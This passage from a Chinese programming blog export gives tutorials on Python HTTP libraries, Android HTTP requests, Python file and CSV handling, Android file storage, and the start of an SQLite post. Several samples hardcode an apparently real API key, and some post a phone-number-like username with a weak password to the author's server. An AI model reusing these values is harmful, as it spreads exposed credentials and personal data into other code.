12运行结果如下：&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125; httplib2模块安装httplib2模块httplib2是一个全面的HTTP客户端库，它也是一个第三方开源库，所以需要自行安装。 1pip install httplib2 带参数和Header的GET请求12345678# -*- coding:utf-8 -*-import httplib2 h = httplib2.Http() url = &apos;http://apis.baidu.com/jidichong/school_search/school_search/?name=清华大学&apos; #带请求参数的urlheaders = &#123;&apos;apikey&apos;: &apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;resp, content = h.request (url,&apos;GET&apos;, None , headers) #使用GET方法时，这里的Body参数必须写成None# print respprint content httplib2 Http对象的request()方法返回两个值： 第一个是httplib2.Response对象，其中包含了服务器返回的所有http头。比如, status为200 表示请求成功。 第二个返回值包含了http服务器返回的实际数据。数据以bytes对象返回，不是字符串。 如果你需要一个字符串，你需要确定字符编码并自己进行转换 12程序运行结果：&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125; 带参数和Header的POST请求1234567891011# -*- coding:utf-8 -*-import httplib2 from urllib import urlencodeh = httplib2.Http() url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;data = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125; headers = &#123;&apos;apikey&apos;: &apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;,&apos;Content-type&apos;: &apos;application/x-www-form-urlencoded&apos;&#125;# 必须带上headers参数，否则POST不成功resp, content = h.request(url,&apos;POST&apos;,urlencode(data),headers) # print resp print content 1程序运行结果同上GET方法 requests模块requests是第三方库，它使用的是urllib3，继承了urllib2的所有特性。Requests支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的URL和POST数据自动编码。同时，它支持Http协议的GET、POST、PUT、DELETE等多种请求方式。 安装1pip install requests 简单GET请求12345678910# -*- coding:utf-8 -*-import requestsimport sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) #设置文件的编码方式req = requests.get(url=&apos;http://blog.line-coding.tech&apos;) print req.urlprint req.status_code print req.text 1234程序运行结果：http://blog.line-coding.tech/200篇幅有限，此处省去网页源代码 带参数和Header的GET请求如果你想为请求添加HTTP头部，只要简单地传递一个dict给headers参数就可以了。 1234567891011# -*- coding:utf-8 -*-import requestsimport sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) #设置文件的编码方式url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;headers = &#123;&apos;apikey&apos;:&apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;params = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125;rep = requests.get(url, params = params, headers = headers)print rep.text 12程序运行结果：&#123;&quot;status&quot;:1,&quot;msg&quot;:&quot;请求成功&quot;,&quot;result&quot;:&#123;&quot;npage&quot;:1,&quot;pageSize&quot;:10,&quot;total&quot;:1,&quot;data&quot;:[&#123;&quot;phone&quot;:&quot;010-62770334;010-62782051&quot;,&quot;website&quot;:&quot;www.tsinghua.edu.cn&quot;,&quot;email&quot;:&quot;zsb@mail.tsinghua.edu.cn&quot;,&quot;address&quot;:&quot;北京市海淀区清华大学&quot;,&quot;zipcode&quot;:&quot;&quot;,&quot;name&quot;:&quot;清华大学&quot;,&quot;img&quot;:&quot;http://img.jidichong.com/school/3.png&quot;,&quot;parent&quot;:&quot;教育部&quot;,&quot;type&quot;:&quot; 211 985&quot;,&quot;profile&quot;:&quot;&quot;,&quot;info&quot;:&quot;院士：68人 博士点：198个 硕士点：181个&quot;,&quot;city&quot;:&quot;北京&quot;&#125;]&#125;&#125; 带参数和Header的POST请求1234567891011# -*- coding:utf-8 -*-import requestsimport sys reload(sys) sys.setdefaultencoding(&apos;utf8&apos;) #设置文件的编码方式url = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;headers = &#123;&apos;apikey&apos;:&apos;c57bc70b78d5926e8cfbb3ad9c195465&apos;&#125;data = &#123;&apos;name&apos;: &apos;清华大学&apos;&#125;r = requests.post(url , data = data, headers = headers )print r.text 12程序运行结果同上带参数和Header的GET请求，注意这是因为这个接口能够接收GET和POST两种方式的请求，如果你使用的接口有规定只使用GET方法，那还是按规定来吧，要不然请求肯定失败。 POST发送JSON数据由于没有找到合适的可以接收JSON数据的API来做这个测试，所以这里摘抄了别人的一段代码，貌似这个接口也不能用了，悲剧啊。不过，反正就是使用json.dumps将dict转换成json格式的数据之后添加到post的参数中然后再发送post请求就对了。 12345678# -*- coding:utf-8 -*-import requestsimport jsonurl = &apos;https://api.github.com/some/endpoint&apos;payload = &#123;&apos;some&apos;: &apos;data&apos;&#125;r = requests.post(url, data = json.dumps(payload))print r.text 貌似这个接口也不能用了，待博主找到一个更好的API接口再来更新吧，先写到这里了。说实话，总结了四个网络请求模块，把我自己都搞晕了，但是最后也还是弄清楚了，可能放在一起来看有点容易搞混，但是有对比才有知道自己应该用哪个啊。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Http网络请求]]></title>
    <url>%2F2016%2F08%2F05%2FAndroid-Http%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[Android网络编程（特别是Http请求）是Android学习中比较重要的内容，也是Android开发中比较常用的内。虽然已经有很多优秀的第三方开源框架供我们使用，也大大提升了我们的开发效率，但是也因此我们对基本Http请求的并不熟悉，我们应该重视基础，从底层去了解网络请求的实现机制。此篇博客总结了Android两种基本的网络请求方式，并通过一个简单的Demo进行实践。 Android网络编程注意事项 安卓的耗时操作（如I/O流操作）的逻辑不能写在主线程，必须写在子线程。 子线程在安卓2.3以后不能更新UI界面（更新就报错），子线程想要更新界面必须结合Handler或者AsyncTask等才可以。 Android网络操作均需添加网络访问权限： 1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 说明事项以下代码中的GET请求都是对博主博客的一个404页面发送的请求，会返回该页面的html代码，POST请求都是对博主服务器上的一个用户注册API接口发送的请求，其中请求参数包括用户名和密码，如果服务器中的数据库已经存在此账号则会返回一个exist，如果注册成功则会返回一个success，否则返回一个error。 使用HttpURLConnection访问网络HttpURLConnection类位于java.net包中，用于发送HTTP请求和获取HTTP响应。该类是抽象类，不能直接实例化，要使用URL的openConnection()方法获得。 发送GET请求1234567891011121314151617181920public void get() &#123; try &#123; URL url = new URL(&quot;http://blog.line-coding.tech/&quot;); HttpURLConnection huc = (HttpURLConnection) url.openConnection(); // mUrlConnection.setRequestMethod(&quot;GET&quot;); //默认就是GET方式，此声明可不要 //获取字节流，并将字节流转换成字符流 InputStreamReader isr = new InputStreamReader(huc.getInputStream()); //缓冲字符流，以便读取 BufferedReader br = new BufferedReader(isr); String inputLine = null; //按行读取数据 while ((inputLine = br.readLine()) != null) &#123; result += inputLine + &quot;\n&quot;; &#125; isr.close(); //关闭输入流 huc.disconnect(); //关闭连接 &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; GET方法在传递中文参数时，会产生乱码，要进行Base64编码来解决乱码问题。 12345678910public String base64Encode(String params) &#123; try &#123; params = Base64.encodeToString(params.getBytes(&quot;utf-8&quot;), Base64.DEFAULT); params = URLEncoder.encode(params,&quot;utf-8&quot;); &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return params;&#125; 发送POST请求12345678910111213141516171819202122232425262728293031public void post() &#123; try &#123; URL url = new URL(&quot;http://data.line-coding.tech/register.php&quot;); HttpURLConnection huc = (HttpURLConnection) url.openConnection(); huc.setRequestMethod(&quot;POST&quot;); huc.setDoInput(true); // 向连接中写入数据 huc.setDoOutput(true); // 向连接中读取数据 huc.setUseCaches(false); // 禁止缓存 huc.setInstanceFollowRedirects(true); // 自动执行Http重定向 huc.setRequestProperty(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); //设置内容类型 DataOutputStream dos = new DataOutputStream(huc.getOutputStream()); //获取输出流 String params = &quot;username=13674852343&quot; + &quot;&amp;password=123456&quot;; //添加请求参数 dos.writeBytes(params); //将数据写入到输出流 dos.flush(); //输出缓存 dos.close(); //关闭输出流 if (huc.getResponseCode() == HttpURLConnection.HTTP_OK) &#123; InputStreamReader isr = new InputStreamReader( huc.getInputStream()); BufferedReader br = new BufferedReader(isr); String inputLine = null; while ((inputLine = br.readLine()) != null) &#123; result += inputLine + &quot;\n&quot;; &#125; isr.close(); &#125; huc.disconnect(); //关闭连接 &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; 使用HttpClient访问网络对于比较复杂的联网操作，使用HttpUrlConnection就不一定能够满足要求，此时，可以使用Apache组织提供的HttpClient项目来实现。HttpClient中将HttpUrlConnection类中的输入/输出流操作统一封装成HttpGet、HttpPost和HttpResponse类。其中HttpGet类代表发送GET请求、HttpPost代表发送POST请求、HttpResponse类代表处理响应的对象。 发送GET请求使用流程（1）创建HttpClient对象 （2）创建HttpGet对象 （3）如需添加参数，可以在url中添加参数，也可调用HttpGet的setParams()方法来添加请求参数。 （4）调用HttpClient对象的execute()方法发送请求。 （5）调用HttpResponse的getEntity()方法获得包含服务器响应内容的HttpEntity对象。 使用示例1234567891011121314151617181920public void getMethod() &#123; String url = &quot;http://blog.line-coding.tech/&quot;; try &#123; HttpClient client = new DefaultHttpClient(); //创建HttpClient对象 HttpGet get = new HttpGet(url); //创建HttpGet对象 HttpResponse response = client.execute(get); //执行HttpClient请求 if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123; result = EntityUtils.toString(response.getEntity()); //获取返回结果 &#125; else &#123; result = &quot;请求失败&quot;; &#125; &#125; catch (ClientProtocolException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; 发送POST请求使用流程（1）创建HttpClient对象 （2）创建HttpGet对象 （3）调用HttpPost的setParams()方法来添加请求参数，也可调用setEntity()方法来设置请求参数。 （4）调用HttpClient对象的execute()方法发送请求。 （5）调用HttpResponse的getEntity()方法获得包含服务器响应内容的HttpEntity对象。 使用示例：123456789101112131415161718192021222324252627public void postMethod() &#123; String url = &quot;http://data.line-coding.tech/register.php&quot;; HttpClient client = new DefaultHttpClient(); //创建HttpClient对象 HttpPost post = new HttpPost(url); //创建HttpGet对象 List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;(); params.add(new BasicNameValuePair(&quot;username&quot;, &quot;13674852343&quot;)); params.add(new BasicNameValuePair(&quot;password&quot;, &quot;123456&quot;)); try &#123; post.setEntity(new UrlEncodedFormEntity(params,&quot;utf-8&quot;)); //添加参数 HttpResponse response = client.execute(post); //执行HttpClient请求 if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) &#123; //判断请求是否成功 result = EntityUtils.toString(response.getEntity()); //获取返回结果 &#125; else &#123; result = &quot;请求失败&quot;; &#125; &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (ClientProtocolException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;; &#125; 简单的Demo通过在MainActivity中使用子线程分别调用以上四个方法来发送Http请求，并通过Handler在子线程和主线程之间传递消息，通知主线程更新UI，以此来测试所写的方法是否可行。 1234567891011121314151617181920212223242526272829303132private TextView mTextView;private String result = &quot;&quot;;private Handler mHandler = new Handler() &#123; public void handleMessage(Message msg) &#123; if (result != null) &#123; mTextView.setText(result); //收到通知，则将Http请求的结果显示在界面上 &#125; &#125;;&#125;;@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mTextView = (TextView) findViewById(R.id.tv_result); new Thread(new Runnable() &#123; //开启子线程来执行网络请求 @Override public void run() &#123; // TODO Auto-generated method stub get(); //使用HttpURLConnection的GET方法 //post(); //使用HttpURLConnection的POST方法 //getMethod(); //使用HttpClient的GET方法 //postMethod(); //使用HttpClient的POST方法 Message msg = mHandler.obtainMessage(); //获取一个Message对象 mHandler.sendMessage(msg); //通知UI进行更新 &#125; &#125;).start();&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Http］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python文件操作]]></title>
    <url>%2F2016%2F08%2F03%2FPython%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[上一篇博文中我们介绍了Python使用Mysql数据库进行数据存储，数据库存储的数据需要特定的工具进行打开，而普通的数据文件是一般的电脑都能打开进行查看的，因此数据库存储的通用性没有文件存储那么好，文件存储也是Python网络爬虫的常用存储方式之一，特别是csv文件，所以我们对于文件的输入输出流操作、缓存、基本的读写方式、文件迭代器等我们都需要有一些基本的了解，并熟练掌握文件的读写操作，为我们的爬虫实战打下坚实的基础。 打开文件打开文件使用open函数，其中文件名是必选参数，文件模式和缓冲是可选参数 1open(name[,mode[,buffering]]) 参数1：文件名文件名一般采用绝对路径，其中会包含\字符，所以可在字符串前加r。 ‘r’是防止字符转义的，如果路径中出现’\t’的话，不加r的话\t就会被转义 而加了’r’之后’\t’就能保留原有的样子。例如： 123456&gt;&gt;&gt; s = &apos;C:\Python27\tcl&apos;&gt;&gt;&gt; print sC:\Python27 cl #解释器将\t识别成一个制表符的间隔&gt;&gt;&gt; s = r&apos;C:\Python27\tcl&apos;&gt;&gt;&gt; print sC:\Python27\tcl #不进行转义，正常输出 可见在字符串前加’r’才能正确使用文件路径 参数2：文件模式 值 描述 值 描述 ‘r’ 读模式 ‘a’ 追加模式 ‘w’ 写模式 ‘b’ 二进制模式 ‘+’ 读/写模式 参数3：缓冲参数是0或者False，输入输出是无缓冲的 参数是1或者True，输入输出是有缓冲的 文件读写写入数据（1）以字符串形式写入 1234567#以写模式打开py.txt文件，若文件不存在，则会创建，若存在则覆盖文件原来的内容f = open(r&apos;D:\Python\py.txt&apos;,&apos;w&apos;)#写入Python之禅的前两句f.write(&apos;Beautiful is better than ugly.\n&apos;)f.write(&apos;Explicit is better than implicit.\n&apos;) f.flush()f.close() 成功写入之后，txt文件内容为以下两行： Beautiful is better than ugly. Explicit is better than implicit. （2）写入行 writelines()将传递进来的一个字符串列表中的所有的字符串写入文件，但是不会增加新行，需要自己手动添加。 123456#采用追加模式，再向py.txt文件写入Python之禅的三四句f = open(r&apos;D:\Python\py.txt&apos;,&apos;a&apos;)content = [&apos;Simple is better than complex.\n&apos;,&apos;Complex is better than complicated.\n&apos;]f.writelines(content) f.flush()f.close() 成功写入之后，txt文件内容为以下四行： Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. 读取数据（1）以字符串形式读取1234f = open(r&apos;D:\Python\py.txt&apos;,&apos;r&apos;)print f.read(6) #读取6个字符print f.read() #读取整个文件f.close() 运行结果如下： Beauti ful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. 可以看出，f.read(6)先读出了6个字符，然后f.read()将其余的内容全部读出来了。 （2）读取行 123f = open(r&apos;D:\Python\py.txt&apos;,&apos;r&apos;)print f.readline() #读取一行数据f.close() readline()函数，读取一行，运行结果如下： Beautiful is better than ugly. 123f = open(r&apos;D:\Python\py.txt&apos;,&apos;r&apos;)print f.readlines() #读取文件的所有行f.close() readlines()函数，读取一个文件的所有行，并将其作为列表返回，运行结果如下： [&apos;Beautiful is better than ugly.\n&apos;, &apos;Explicit is better than implicit.\n&apos;, &apos;Simple is better than complex.\n&apos;, &apos;Complex is better than complicated.\n&apos;] 对文件内容进行迭代按字节处理1234567filename = r&apos;D:\Python\py.txt&apos;f = open(filename)while True: char = f.read(1) #每次读取一个字符 if not char: break #没有字符可读了则停止 print char #打印字符f.close() 按行处理1234567filename = r&apos;D:\Python\py.txt&apos;f = open(filename)while True: line = f.readline().strip() #读取一行，并去除空行 if not line: break #如果没有下一行了则停止 print line #打印读取到的一行f.close() 程序运行结果如下： Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. 使用fileinput实现懒惰行迭代1234import fileinputfilename = r&apos;D:\Python\py.txt&apos;for line in fileinput.input(filename): print line.strip() #打印读取到的行，并去除空行 程序运行结果同2 文件迭代器12345filename = r&apos;D:\Python\py.txt&apos;f = open(filename)for line in f: print line.strip() #打印读取到的行，并去除空行f.close() 程序运行结果同2 关闭文件写入过的文件总应该关闭，因为Python可能会缓存写入的数据，如果程序奔溃了，那么数据就不会被写入到文件，为了安全起见，在使用完文件后要进行关闭操作。 12345#打开文件try: #写入数据finally: file.close() csv文件处理逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。csv文件经常用于网络数据爬取的数据存储。csv文件可以用记事本和excel打开进行查看。 123456789101112131415161718192021# -*- coding: utf-8 -*-import csvcsvFile = open(&quot;D:/Python/data.csv&quot;,&apos;wb+&apos; )try: writer = csv.writer(csvFile) writer.writerow((&apos;Id&apos;,&apos;Name&apos;,&apos;Age&apos;)) #写入一行数据做列名 data = [(20160001,&apos;fzy&apos;,&apos;21&apos;),(20160002,&apos;lyj&apos;,&apos;21&apos;),(20160003,&apos;ljj&apos;,&apos;20&apos;)] writer.writerows(data) #写入多行 writer.writerow((20160004,&apos;cyx&apos;,&apos;24&apos;)) #写入一行数据finally: csvFile.close()csvFile = open(&quot;D:/Python/data.csv&quot;,&apos;rb+&apos; )try: reader = csv.reader(csvFile) for line in reader: print linefinally: csvFile.close() 程序运行结果： [&apos;Id&apos;, &apos;Name&apos;, &apos;Age&apos;] [&apos;20160001&apos;, &apos;fzy&apos;, &apos;21&apos;] [&apos;20160002&apos;, &apos;lyj&apos;, &apos;21&apos;] [&apos;20160003&apos;, &apos;ljj&apos;, &apos;20&apos;] [&apos;20160004&apos;, &apos;cyx&apos;, &apos;24&apos;]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android数据存储之文件存储]]></title>
    <url>%2F2016%2F07%2F29%2FAndroid%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%2F</url>
    <content type="text"><![CDATA[前面两篇博客分别介绍了Android的SharedPreferences数据存储和SQLite数据库存储，此篇博客介绍Android数据存储的第三种方式：文件存储，这也是我们平时最为常用的，他的很多操作与Java文件操作基本一致，只是因为Android是基于Linux操作系统，所以需要对于文件目录结构需要有更深入的理解。 Android内部存储与外部存储Android本身基于Linux操作系统，所以它的内部存储空间，对于应用程序和用户来讲就是“/data/data”目录。它与其他的（外部存储）相比有着存储方便，操作简单，更加稳定、安全等优点。但是它比较有限，比较可贵。 内部存储（internal storage）内部存储不是内存。内部存储位于系统中很特殊的一个位置，如果你想将文件存储于内部存储中，那么文件默认只能被你的应用访问到，且一个应用所创建的所有文件都在和应用包名相同的目录下。也就是说应用创建于内部存储的文件，与这个应用是关联起来的。当一个应用卸载之后，内部存储中的这些文件也被删除。 内部存储空间十分有限，因而显得可贵，另外，它也是系统本身和系统应用程序主要的数据存储所在地，一旦内部存储空间耗尽，手机也就无法使用了。所以对于内部存储空间，我们要尽量避免使用。 内部存储目录/data/data/包名/ 说明 /data/data/包名/shared_prefs sharedpreferrence文件存放目录 /data/data/包名/databases 数据库文件存放目录 /data/data/包名/files 应用程序默认的数据存储目录 /data/data/包名/cache 应用程序默认的缓存文件存放目录 外部存储（external storage）外部存储一般就是storage文件夹或者mnt文件夹，在storage文件夹中有一个sdcard文件夹，这个文件夹中的文件又分为两类，一类是公有目录，还有一类是私有目录 由于内部存储空间有限，在开发中我们一般都是操作外部存储空间，Google官方建议我们App的数据应该存储在外部存储的私有目录中该App的包名下，这样当用户卸载掉App之后，相关的数据会一并删除，如果你直接在/storage/sdcard目录下创建了一个应用的文件夹，那么当你删除应用的时候，这个文件夹就不会被删除。 外部存储目录storage/sdcard，它又分为公有目录和私有目录，其中的公有目录有九大类，比如DCIM、DOWNLOAD等这种系统为我们创建的文件夹，私有目录就是Android这个文件夹，这个文件夹打开之后里边有一个data文件夹，打开这个data文件夹，里边有许多包名组成的文件夹。 注：所有的这些目录结构都可以通过打开Android模拟器，然后使用DDMS中的File Explorer进行查看。 res/raw和assetsres/raw和assets的相同点两者目录下的文件在打包后会原封不动的保存在apk包中，不会被编译成二进制。 res/raw和assets的不同点（1）res/raw中的文件会被映射到R.java文件中，访问的时候直接使用资源ID即R.id.filename；assets文件夹下的文件不会被映射到R.java中，访问的时候需要AssetManager类。 （2）res/raw不可以有目录结构，而assets则可以有目录结构，也就是assets目录下可以再建立文件夹 另外： assets：用于存放需要打包到应用程序的静态文件，以便部署到设备中。与res/raw不同点在于，ASSETS支持任意深度的子目录。这些文件不会生成任何资源ID，必须使用/assets开始（不包含它）的相对路径名。 res:用于存放应用程序的资源（如图标、GUI布局等），将被打包到编译后的Java中。不支持深度子目录 res/raw:存放通用的文件， 该文件夹内的文件将不会被编译成二进制文件，按原样复制到设备上。 文件存储操作读写/data/data/&lt;应用程序名&gt;/files/目录上的文件（1）文件权限 MODE_PRIVATE-默认操作模式，代表该文件是私有数据，只能被应用本身访问，在该模式下，写入的内容会覆盖原文件的内容。 MODE_APPEND-该模式会检查文件是否存在，存在就往文件追加内容，否则就创建新文件。 MODE_WORLD_READABLE和MODE_WORLD_WRITEABLE-用来控制其他应用程序是否有权限读写该文件。 （2）读文件 1234567891011121314public String readFile(String fileName) throws IOException &#123; String res = &quot;&quot;; try &#123; FileInputStream fis = openFileInput(fileName); int length = fis.available(); byte[] bytes = new byte[length]; fis.read(bytes); res = EncodingUtils.getString(bytes, &quot;UTF-8&quot;); fis.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return res;&#125; （3）写文件12345678910public void writeFile(String fileName, String str) throws IOException &#123; try &#123; FileOutputStream fos = openFileOutput(fileName, MODE_PRIVATE); byte[] bytes = str.getBytes(); fos.write(bytes); fos.close(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; 读写SD卡中的文件。也就是/storage/sdcard/目录下面的文件目录/mnt/sdcard和目录/sdcard没有区别，它们都是指向目录/storage/sdcard的快捷方式。 （1）添加权限 1234&lt;!-- SDCard中创建与删除文件权限 --&gt; &lt;uses-permission android:name=&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;/&gt; &lt;!-- 向SDCard写入数据权限 --&gt; &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt; （2）判断SDCard是否存在1234public boolean isSdCardExist() &#123; return Environment.getExternalStorageState().equals( Environment.MEDIA_MOUNTED); &#125; （3）获取SD卡根目录1234567891011 public File getSdCardPath() &#123; boolean exist = isSdCardExist(); File dir; if (exist) &#123; dir = Environment.getExternalStorageDirectory(); &#125; else &#123; dir = null; &#125; return dir;&#125; （4）写文件 1234567891011121314151617181920public void writeSDCardFile(String fileName, String str) &#123; File myfile = new File(getSdCardPath(), fileName); try &#123; if(!myfile.exists())&#123; //如果文件不存在则创建新文件 myfile.createNewFile(); &#125; FileOutputStream fos = new FileOutputStream(myfile); byte[] bytes = str.getBytes(&quot;UTF-8&quot;); //将字符串转换成字节序列，并制定编码为UTF-8 fos.write(bytes); fos.flush(); //将缓冲区中的数据强制写出 fos.close(); //关闭数据流 &#125; catch (FileNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125;&#125; （5）读文件 1234567891011121314151617181920public String readSDCardFile(String fileName) &#123; String res = null; File myfile = new File(getSdCardPath(), fileName); try &#123; FileInputStream fis = new FileInputStream(myfile); int length = fis.available(); //得到数据长度 byte[] bytes = new byte[length]; //开辟一个字节数组 fis.read(bytes); //读出数据 fis.close(); //关闭数据流 res = new String(bytes, &quot;UTF-8&quot;); //将字符数组转换成字符串，指定编码为UTF-8 &#125; catch (FileNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return res;&#125; （6）删除文件 1234public void deleteSDCardFile(String fileName) &#123; File myfile = new File(getSdCardPath(), fileName); myfile.delete();&#125; 除了上面讲到的读文件、写文件、删除文件外，File对象还有创建文件、设置可读可写等方法，具体的可以自己取查看相应的文档。 从res/raw中读取文件数据读取文本文件时需要考虑编码格式的问题。在简体中文Windows操作系统中，ANSI 编码代表 GBK 编码，文本文件保存时默认使用ANSI编码，所以在读取文件获取字符串时要使用GBK进行编码。以下代码以读取txt文件为例。 12345678910111213141516171819public String getRawFile(int resId) &#123; String res = &quot;&quot;; try &#123; // 得到资源中的Raw数据流 InputStream in = getResources().openRawResource(resId); int length = in.available(); byte[] bytes = new byte[length]; // 读取数据 in.read(bytes); // 依test.txt的编码类型选择合适的编码，如果不调整会乱码 res = EncodingUtils.getString(bytes, &quot;GBK&quot;); in.close(); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return res;&#125; 从assets中读取文件数据以下代码同样以读取txt文件为例。 1234567891011121314151617public String getAssertFile(String fileName) &#123; String res = null; try &#123; // 得到资源中的asset数据流 InputStream in = getResources().getAssets().open(fileName); int length = in.available(); byte[] bytes = new byte[length]; in.read(bytes); in.close(); res = EncodingUtils.getString(bytes, &quot;GBK&quot;); &#125; catch (IOException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; return res;&#125; 参考博客： [1] android中的文件操作详解以及内部存储和外部存储 [2] android资源目录—assets与res/raw区别 [3] Android - 文件读写操作 总结]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,文件］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android SQLite基本操作详解]]></title>
    <url>%2F2016%2F07%2F26%2FAndroid-SQLite%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[SQLite 是一个开源的嵌入式关系数据库，实现自包容、零配置、支持事务的SQL数据库引擎。 其特点是高度便携、使用方便、结构紧凑、高效、可靠。之前写过一个简单的Android记事本程序，使用过SQLite数据库，但是并没有真正理解并消化。前段时间认真学习了Mysql数据库的相关知识，对数据库有了更深入的认识，于是，也准备把Android这一块的SQLite数据库好好整理一下。 SQLite支持的数据类型： NULL(空值)、INTEGER(整型值)、REAL(浮点值)、TEXT(字符串值)、BLOB(二进制对象) 数据库创建与管理使用辅助类SQLiteOpenHelper来管理数据库的创建和版本更新，在工程中新建一个类SQLiteUtil用于管理数据库，继承自SQLiteOpenHelper。 必须实现构造方法public DatabaseHelper(Context context, String name, CursorFactory factory, int version) 重写两个抽象方法public void onCreate(SQLiteDatabase db)，方法当数据库第一次被建立的时候被执行，一般把创建表,初始化数据等操作放在这里。 public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)方法，当数据库版本更新时会自动执行。 1234567891011121314151617181920212223242526272829303132333435public class SQLiteUtil extends SQLiteOpenHelper&#123; public static final String TABLE_NAME_STUDENT = &quot;student&quot;; public static final String COLUMN_NAME_ID = &quot;_id&quot;; public static final String COLUMN_NOTE_NO = &quot;Sno&quot;; public static final String COLUMN_NOTE_NAME = &quot;Sname&quot;; public static final String COLUMN_NOTE_AGE = &quot;Sage&quot;; public static final String COLUMN_NOTE_SEX = &quot;Ssex&quot;; public SQLiteUtil(Context context, String name, CursorFactory factory,int version) &#123; super(context, name, factory, version); // TODO Auto-generated constructor stub &#125; @Override public void onCreate(SQLiteDatabase db) &#123; // TODO Auto-generated method stub //在这里创建数据库，后文会用到 db.execSQL(&quot;CREATE TABLE &quot; + TABLE_NAME_STUDENT + &quot;(&quot; + 